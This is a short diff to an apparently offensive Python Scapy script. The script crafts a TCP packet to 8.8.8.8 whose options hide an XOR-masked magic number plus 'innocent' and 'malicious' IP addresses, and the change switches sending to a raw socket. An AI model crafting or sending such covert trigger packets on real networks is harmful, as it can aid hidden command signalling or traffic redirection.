@@ -25,6 +25,7 @@ xored_random_numer = random_number ^ XOR_MAGIC
 print "random 4 bytes number: %d" % random_number
 print "xored with magic: %d" %xored_random_numer
 
+
 ip  = IP(dst="8.8.8.8")
 tcp = TCP(sport= random.randint(1000,65000),
           dport= 80, 
@@ -35,6 +36,12 @@ tcp = TCP(sport= random.randint(1000,65000),
                       socket.inet_aton(options.innocent) + 
                       socket.inet_aton(options.malicious)
           )])
-send(ip/tcp)
+# using raw socket
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+# dont put headers
+s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+s.sendto(bytes(ip/tcp), ("8.8.8.8" , 0 ))
 
+# using scpay
+#send(ip/tcp)
 
